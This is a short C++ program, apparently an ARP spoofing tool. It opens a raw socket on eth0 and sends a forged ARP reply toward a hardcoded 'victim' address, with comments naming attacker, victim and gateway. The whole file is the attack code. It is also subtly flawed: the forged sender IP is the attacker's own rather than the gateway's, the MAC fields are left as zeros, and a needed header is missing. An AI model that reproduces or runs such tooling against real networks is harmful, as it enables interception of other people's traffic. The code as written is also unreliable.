#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/if_ether.h>
#include <netinet/arp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>

#define ATTACKER_IP "192.168.1.2"  // Attacker's IP address
#define VICTIM_IP "192.168.1.100"  // Victim's IP address (target of ARP spoofing)
#define GATEWAY_IP "192.168.1.1"   // Default Gateway IP

// Define ARP packet structure
struct arp_packet {
    struct ether_header eth_hdr;
    struct ether_arp arp_hdr;
};

int main() {
    int sock;
    struct sockaddr_ll sa;
    struct arp_packet packet;
    struct ifreq ifr;

    // Create a raw socket for Ethernet frame
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        std::cerr << "Socket creation failed!" << std::endl;
        return -1;
    }

    // Get network interface details (e.g., eth0)
    strcpy(ifr.ifr_name, "eth0");  // Change this to your network interface name
    ioctl(sock, SIOCGIFINDEX, &ifr);

    // Set up sockaddr_ll to specify the interface for sending the packet
    memset(&sa, 0, sizeof(struct sockaddr_ll));
    sa.sll_ifindex = ifr.ifr_ifindex;

    // Get the MAC addresses for Attacker, Victim, and Gateway
    // For simplicity, using hardcoded values, but you can retrieve them dynamically
    unsigned char attacker_mac[] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};  // Attacker MAC address
    unsigned char victim_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};   // Victim MAC address (to be obtained)
    unsigned char gateway_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};  // Gateway MAC address (to be obtained)

    // Ethernet header
    memset(&packet.eth_hdr, 0, sizeof(struct ether_header));
    memcpy(packet.eth_hdr.ether_dhost, victim_mac, 6);  // Victim's MAC address
    memcpy(packet.eth_hdr.ether_shost, attacker_mac, 6);  // Attacker's MAC address
    packet.eth_hdr.ether_type = htons(ETH_P_ARP);  // ARP Protocol type

    // ARP header
    memset(&packet.arp_hdr, 0, sizeof(struct ether_arp));
    packet.arp_hdr.arp_hrd = htons(ARPHRD_ETHER);  // Hardware type (Ethernet)
    packet.arp_hdr.arp_pro = htons(ETH_P_IP);     // Protocol type (IPv4)
    packet.arp_hdr.arp_hln = 6;                   // MAC address length
    packet.arp_hdr.arp_pln = 4;                   // IP address length
    packet.arp_hdr.arp_op = htons(ARPOP_REPLY);   // ARP Reply operation (spoofing)

    // Fill in the sender (attacker) and target (victim) information in ARP reply
    memcpy(packet.arp_hdr.arp_sha, attacker_mac, 6);  // Attacker's MAC address
    inet_pton(AF_INET, ATTACKER_IP, &packet.arp_hdr.arp_spa);  // Attacker's IP address (source IP)

    memcpy(packet.arp_hdr.arp_tha, victim_mac, 6);  // Victim's MAC address (target MAC)
    inet_pton(AF_INET, VICTIM_IP, &packet.arp_hdr.arp_tpa);  // Victim's IP address (target IP)

    // Send the ARP reply (spoofing the victim)
    if (sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr*)&sa, sizeof(struct sockaddr_ll)) < 0) {
        std::cerr << "Send failed!" << std::endl;
        return -1;
    }

    std::cout << "ARP Spoofing (ARP Reply) sent!" << std::endl;

    close(sock);
    return 0;
}
